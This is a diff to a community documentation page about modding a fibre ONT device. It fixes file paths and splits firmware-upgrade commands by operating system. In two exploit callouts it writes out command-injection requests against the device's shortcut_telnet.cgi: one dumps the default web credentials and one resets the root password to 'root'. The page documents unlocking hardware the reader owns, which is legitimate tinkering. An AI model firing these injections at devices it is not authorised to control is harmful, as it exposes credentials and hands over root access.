@@ -115,15 +115,16 @@ assigned to the host interface.
 
 ### Web credentials
 
-The default web credentials can be found in `/ptconf/param_ct.xml` and modifications from the web UI are stored in
-`/ptconf/usrconfig_conf` as base64 encoded strings.
+The default web credentials can be found in `/ptrom/ptconf/param_ct.xml` and modifications from the web UI are stored in
+`/ptrom/ptconf/usrconfig_conf` as base64 encoded strings.
 
 !!! warning
     Passwords have a maximum length of 16 characters which are not restricted by the web UI.
 
 ??? bug "Exploit to disclose the default web credentials"
     
-    Navigate to <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>
+    To dump the web credentials from `/ptrom/ptconf/param_ct.xml`, navigate to
+    <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>
 
 === "&lt;= v1.0.20"
 
@@ -192,7 +193,7 @@ us.
     !!! warning "The root password is not known at this time"
 
     ???+ bug "Exploit to temporarily change the root password"
-        Temporarily change the root password to `root`.
+        Run the following command to temporarily change the root password to `root`:
 
         === ":fontawesome-brands-windows: Windows"
 
@@ -205,6 +206,7 @@ us.
             ``` console
             $ curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
             ```
+
 ### Local upgrade
 
 The extracted `local-upgrade.tar` includes a <ins>safer</ins> upgrade script in comparison to the built-in web UI.
@@ -227,10 +229,19 @@ SSH must be enabled from the web UI prior to running the shell commands.
 
 Run the following commands from the host terminal to upgrade to the 8311 community firmware.
 
-```
-scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
-ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
-```
+=== ":fontawesome-brands-windows: Windows"
+
+    ```
+    scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
+    ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
+    ```
+
+=== ":material-apple: macOS / :material-linux: Linux"
+
+    ```
+    scp -O -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa local-upgrade.tar root@192.168.11.1:/tmp/
+    ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa root@192.168.11.1 'tar xvf /tmp/local-upgrade.tar -C /tmp/ -- upgrade.sh && /tmp/upgrade.sh /tmp/local-upgrade.tar'
+    ```
 
 Once rebooted, begin to enjoy the fruits of the 8311 community, it's not at all possible without each and everyone of
 us.
